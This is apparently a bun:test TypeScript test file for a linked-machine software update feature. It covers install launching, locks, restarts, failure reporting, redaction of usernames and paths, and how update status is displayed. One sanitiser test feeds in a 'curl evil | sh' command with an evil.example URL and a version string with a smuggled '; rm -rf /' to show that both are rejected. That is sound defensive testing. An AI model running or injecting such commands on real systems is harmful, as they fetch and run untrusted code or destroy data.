/**
 * Update on a linked machine, both ends without a network: what the far machine does when its door is pressed
 * (inbox-updates.ts: its own answer from GitHub, its lock, its restart, its way of saying nothing changed, and what
 * it tells the other machine), and how this machine draws what it hears (machineUpdateView). The two real Inboxes
 * are in inbox-machines.test.ts, the compiled ones in tests/e2e/inbox-machine-update.spec.ts.
 */
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { writeUpdateState, type FetchReleaseResult } from "@plannotator/shared/update-check";
import { autoUpdatePaths, type InstallerLaunch } from "./auto-update";
import { machineUpdateView } from "./inbox-machines";
import { parseFarUpdate } from "./inbox-peer-link";
import { createInboxUpdates, machinePath } from "./inbox-updates";
import { UPDATE_STAGING_PREFIX } from "./update-log";

const RUNS = "0.28.40";
const NEWEST = "0.28.42";

let root: string;
let saved: string | undefined;
const stops: (() => void)[] = [];

beforeEach(() => {
  root = realpathSync(mkdtempSync(join(tmpdir(), "plannotator-machine-update-")));
  saved = process.env.PLANNOTATOR_DATA_DIR;
});

afterEach(() => {
  for (const stop of stops.splice(0)) stop();
  if (saved === undefined) delete process.env.PLANNOTATOR_DATA_DIR;
  else process.env.PLANNOTATOR_DATA_DIR = saved;
  rmSync(root, { recursive: true, force: true });
});

function farMachine(over: { managed?: boolean; version?: string; sessions?: number; answer?: string | null } = {}) {
  const home = join(root, "Users", "ramos");
  const dataDir = join(home, ".plannotator");
  mkdirSync(dataDir, { recursive: true });
  process.env.PLANNOTATOR_DATA_DIR = dataDir;
  const binary = join(home, "plannotator");
  writeFileSync(binary, "old");
  const version = over.version ?? RUNS;
  const facts = { onDisk: version as string | null, restarts: 0, changes: 0, launches: [] as InstallerLaunch[], asked: 0 };
  const answer = over.answer === undefined ? NEWEST : over.answer;
  const fetchRelease = async (): Promise<FetchReleaseResult> => {
    facts.asked++;
    return answer ? { ok: true, release: { tag: `v${answer}`, body: "" } } : { ok: false, error: "offline" };
  };
  const updates = createInboxUpdates({
    dataDir,
    version,
    binaryPath: binary,
    healthTickMs: 3_600_000,
    onChange: () => void facts.changes++,
    onRestartWanted: () => void facts.restarts++,
    home,
    fetchRelease,
    fetchReleasePage: fetchRelease,
    fetchReleaseTag: fetchRelease,
    isManaged: () => over.managed ?? true,
    listSessions: () =>
      Array.from({ length: over.sessions ?? 0 }, (_, i) => ({
        pid: i + 1,
        port: 1000 + i,
        url: "http://x",
        mode: "annotate",
        project: "secret-client-project",
        startedAt: new Date(0).toISOString(),
        label: "secret label",
      })) as never,
    launchInstaller: (launch) => void facts.launches.push(launch),
    probeVersion: async () => facts.onDisk,
  });
  stops.push(() => updates.stop());
  const paths = autoUpdatePaths(dataDir);
  return {
    updates,
    facts,
    home,
    dataDir,
    /** The install script swaps the binary. */
    swap(to: string) {
      facts.onDisk = to;
      writeFileSync(binary, `new ${to}`);
    },
    /** The wrapper finishes: its result, then the lock goes. */
    finish(exitCode: number, tag = `v${NEWEST}`) {
      writeFileSync(paths.result, JSON.stringify({ version: tag, exitCode }));
      rmSync(paths.lock, { force: true });
    },
    takeLock() {
      writeFileSync(paths.lock, String(process.pid));
    },
    async settled() {
      // A page load's tick: a fresh look at the binary, then the judgement.
      updates.nudge();
      await Bun.sleep(30);
    },
  };
}

describe("the far machine, when a linked machine presses Update", () => {
  test("it asks GitHub itself and installs that answer, past what it knew, even with its update checks off", async () => {
    const far = farMachine();
    writeUpdateState({ latestRelease: { tag: "0.28.41", fetchedAt: Date.now() }, releaseCheck: { attemptedAt: Date.now() } }, far.dataDir);
    expect(await far.updates.machineStart()).toEqual({ outcome: "launched" });
    expect(far.facts.asked).toBe(1);
    expect(far.facts.launches.map((launch) => launch.version)).toEqual([`v${NEWEST}`]);
  });

  test("offline, the release it already knew is installed", async () => {
    const far = farMachine({ answer: null });
    writeUpdateState({ latestRelease: { tag: "0.28.41", fetchedAt: Date.now() }, releaseCheck: { attemptedAt: Date.now() } }, far.dataDir);
    expect(await far.updates.machineStart()).toEqual({ outcome: "launched" });
    expect(far.facts.launches.map((launch) => launch.version)).toEqual(["v0.28.41"]);
  });

  test("it restarts itself only once the install script has finished: the binary swap alone is not the end", async () => {
    const far = farMachine();
    await far.updates.machineStart();
    far.swap(NEWEST);
    await far.settled();
    // The script still installs skills and plugins.
    expect(far.updates.current()?.state).toBe("ready");
    expect(far.facts.restarts).toBe(0);
    far.finish(0);
    await far.settled();
    expect(far.facts.restarts).toBe(1);
    await far.settled();
    expect(far.facts.restarts).toBe(1);
  });

  test("a new binary this Inbox was not asked about never restarts it: the person there decides", async () => {
    const far = farMachine();
    far.swap(NEWEST);
    await far.settled();
    expect(far.updates.current()?.state).toBe("ready");
    expect(far.facts.restarts).toBe(0);
  });

  test("a binary already on disk is a restart, with nothing installed", async () => {
    const far = farMachine();
    far.swap(NEWEST);
    await far.settled();
    expect(await far.updates.machineStart()).toEqual({ outcome: "restarting" });
    expect(far.facts.launches).toEqual([]);
    await far.settled();
    expect(far.facts.restarts).toBe(1);
  });

  test("an install already running is joined, and its ending counts as this press's", async () => {
    const far = farMachine();
    far.takeLock();
    expect(await far.updates.machineStart()).toEqual({ outcome: "joined" });
    expect(far.facts.launches).toEqual([]);
    far.swap(NEWEST);
    far.finish(0);
    await far.settled();
    expect(far.facts.restarts).toBe(1);
  });

  test("an install that ends with no error and the same binary says so, and does not restart", async () => {
    const far = farMachine();
    await far.updates.machineStart();
    far.finish(0);
    await far.settled();
    expect(far.facts.restarts).toBe(0);
    expect(far.updates.noChange()).toBe(NEWEST);
    expect(far.updates.machineRead().failure).toEqual({ exit_code: 0, unchanged: true });
    // Try Again starts over.
    const again = await far.updates.machineStart();
    expect(again).toEqual({ outcome: "launched" });
    expect(far.updates.noChange()).toBeNull();
    expect(far.updates.machineRead().failure).toBeNull();
  });

  test("the check does not call a running install 'no change', though the binary has not moved yet", async () => {
    const far = farMachine();
    await far.updates.machineStart();
    await far.settled();
    expect(far.updates.current()?.state).toBe("updating");
    expect(far.updates.noChange()).toBeNull();
  });

  test("a failed install stays the old version: no restart, and its exit code, not 'no change'", async () => {
    const far = farMachine();
    await far.updates.machineStart();
    far.finish(113);
    await far.settled();
    expect(far.facts.restarts).toBe(0);
    expect(far.updates.current()?.state).toBe("failed");
    expect(far.updates.noChange()).toBeNull();
    expect(far.updates.machineRead().failure?.exit_code).toBe(113);
  });

  test("a copy the install script does not own runs nothing, and neither does a development build", async () => {
    const unmanaged = farMachine({ managed: false });
    expect(await unmanaged.updates.machineStart()).toEqual({ outcome: "unmanaged" });
    expect(unmanaged.facts.launches).toEqual([]);
    expect(unmanaged.updates.selfUpdates()).toBe(false);
    const dev = farMachine({ version: "dev" });
    expect(await dev.updates.machineStart()).toEqual({ outcome: "dev-build" });
    expect(dev.facts.launches).toEqual([]);
    expect(dev.updates.selfUpdates()).toBe(false);
  });
});

describe("what the far machine tells the other one", () => {
  test("no username and no project name goes over the wire: the log is ~/…, a review is a count", async () => {
    const far = farMachine({ sessions: 2 });
    await far.updates.machineStart();
    // A failed download whose reason names a folder in the home.
    writeFileSync(autoUpdatePaths(far.dataDir).log, `[t] ${UPDATE_STAGING_PREFIX}the temp folder ${far.home}/tmp is full (ENOSPC)\n[t] update: install.sh exited 75\n`);
    far.finish(75);
    await far.settled();
    const answer = far.updates.machineRead();
    expect(answer.log).toBe("~/.plannotator/update.log");
    expect(answer.open_reviews).toBe(2);
    expect(answer.failure?.exit_code).toBe(75);
    expect(answer.failure?.prepare).toBe("the temp folder ~/tmp is full (ENOSPC)");
    const wire = JSON.stringify(answer);
    expect(wire).not.toContain("ramos");
    expect(wire).not.toContain(far.home);
    expect(wire).not.toContain("secret");
  });

  test("a path outside the home folder never carries a name either", () => {
    expect(machinePath("/Users/ramos/.plannotator/update.log", "/Users/ramos")).toBe("~/.plannotator/update.log");
    expect(machinePath("C:\\Users\\ramos\\.plannotator\\update.log", "C:\\Users\\ramos")).toBe("~\\.plannotator\\update.log");
    // Not the same folder, though it starts the same.
    expect(machinePath("/Users/ramos2/update.log", "/Users/ramos")).toBe("update.log");
    expect(machinePath("/srv/plannotator/ramos/update.log", "/Users/ramos", "/srv/plannotator/ramos")).toBe("$PLANNOTATOR_DATA_DIR/update.log");
    expect(machinePath("/mnt/ramos/update.log", "/Users/ramos", "/srv/x")).toBe("update.log");
  });

  test("only a state, a version that reads as one, and whether the script owns it pass: nothing it could point at", () => {
    expect(parseFarUpdate({ state: "available", version: "0.28.50", action: "script", releaseUrl: "https://evil.example", command: "curl evil | sh" })).toEqual({
      state: "available",
      version: "0.28.50",
      action: "script",
    });
    expect(parseFarUpdate({ state: "available", version: "0.28.50; rm -rf /", action: "script" })).toBeNull();
    expect(parseFarUpdate({ state: "explode", version: "0.28.50" })).toBeNull();
    expect(parseFarUpdate(null)).toBeNull();
  });
});

describe("how this machine draws what it hears", () => {
  const clocks = { updatedShownMs: 1000, restartBackMs: 5000 };
  const NOW = 1_000_000;
  const own = { current: "0.28.49", latest: null };
  const peer = (over: Partial<Parameters<typeof machineUpdateView>[0]> = {}): Parameters<typeof machineUpdateView>[0] => ({
    state: "online",
    since: NOW,
    version: "0.28.46",
    farUpdate: null,
    noChange: null,
    asked: null,
    updated: null,
    canUpdate: true,
    selfUpdate: true,
    ...over,
  });
  const view = (over: Partial<Parameters<typeof machineUpdateView>[0]> = {}, at = NOW, mine: typeof own | null = own) => machineUpdateView(peer(over), mine, at, clocks);

  test("behind: the newest of its own answer, this machine's version, and the newest this machine knows of", () => {
    expect(view()).toMatchObject({ phase: "behind", target: "0.28.49", from: "0.28.46" });
    expect(view({ farUpdate: { state: "available", version: "0.28.50", action: "script" } })).toMatchObject({ phase: "behind", target: "0.28.50" });
    expect(view({}, NOW, { current: "0.28.49", latest: "0.28.51" })).toMatchObject({ phase: "behind", target: "0.28.51" });
  });

  test("this machine is the older one, or level: the other machine's row says nothing", () => {
    expect(view({ version: "0.28.49" })).toBeNull();
    expect(view({ version: "0.28.50" })).toBeNull();
    expect(view({ version: "dev" })).toBeNull();
    expect(view({ version: null })).toBeNull();
  });

  test("an older Inbox without the route still shows as behind, and says it cannot be updated from here", () => {
    expect(view({ version: "0.28.44", canUpdate: false })).toMatchObject({ phase: "behind", can_update: false });
  });

  test("its own state goes first while it is online", () => {
    for (const state of ["updating", "ready", "failed"] as const) {
      expect(view({ farUpdate: { state, version: "0.28.50", action: "script" } })).toMatchObject({ phase: state, target: "0.28.50" });
    }
  });

  test("an install that changed nothing reads as failed, not as Update again", () => {
    expect(view({ noChange: "0.28.50", farUpdate: { state: "available", version: "0.28.50", action: "script" } })).toMatchObject({ phase: "failed", target: "0.28.50" });
  });

  test("right after the press it reads updating; if nothing there ever says so, it stops", () => {
    const asked = { from: "0.28.46", at: NOW };
    expect(view({ asked }, NOW + 1000)).toMatchObject({ phase: "updating" });
    expect(view({ asked }, NOW + 60_000)).toMatchObject({ phase: "behind" });
  });

  test("gone after a press: restarting, then not back; gone with no press is only asleep", () => {
    const asked = { from: "0.28.46", at: NOW - 1000 };
    expect(view({ state: "offline", asked }, NOW + 1)).toMatchObject({ phase: "restarting" });
    expect(view({ state: "offline", asked }, NOW + clocks.restartBackMs)).toMatchObject({ phase: "not_back" });
    // A stale "updating" heard before it went away is not said of a sleeping machine.
    expect(view({ state: "offline", farUpdate: { state: "updating", version: "0.28.50", action: "script" } })).toMatchObject({ phase: "behind" });
  });

  test("back on a new version: Updated for a while, then the plain row", () => {
    const updated = { from: "0.28.46", to: "0.28.49", at: NOW };
    expect(view({ version: "0.28.49", updated }, NOW + 1)).toMatchObject({ phase: "updated", from: "0.28.46", target: "0.28.49" });
    expect(view({ version: "0.28.49", updated }, NOW + clocks.updatedShownMs)).toBeNull();
  });

  test("a machine that removed the link says nothing about versions", () => {
    expect(view({ state: "revoked" })).toBeNull();
  });
});
